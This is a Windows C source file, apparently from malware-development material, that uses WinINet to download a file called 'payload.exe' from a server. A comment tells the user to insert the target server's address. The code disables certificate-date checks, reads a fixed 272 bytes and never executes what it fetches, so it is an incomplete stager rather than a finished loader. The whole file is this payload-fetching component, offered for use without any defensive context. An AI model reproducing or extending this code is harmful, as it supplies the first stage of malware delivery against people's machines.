#include <stdio.h>
#include <windows.h>
#include <wininet.h>

BOOL GetPayloadFromUrl() {
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    PBYTE pBytes = NULL;
    DWORD dwBytesRead = 0;
    BOOL result = FALSE;

    hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/payload.exe", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0); // write your target server's ip and payload name
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    pBytes = (PBYTE)LocalAlloc(LPTR, 272);
    if (pBytes == NULL) {
        printf("[!] LocalAlloc Failed With Error : %d\n", GetLastError());
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    if (!InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)) {
        printf("[!] InternetReadFile Failed With Error : %d\n", GetLastError());
        goto cleanup;
    }

    result = TRUE;

cleanup:
    if (pBytes) LocalFree(pBytes);
    if (hInternetFile) InternetCloseHandle(hInternetFile);
    if (hInternet) InternetCloseHandle(hInternet);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    return result;
}

int main(int argc, char *argv[]) {
    if (GetPayloadFromUrl()) {
        printf("[+] Payload downloaded successfully.\n");
    } else {
        printf("[!] Failed to download payload.\n");
    }
    return 0;
}
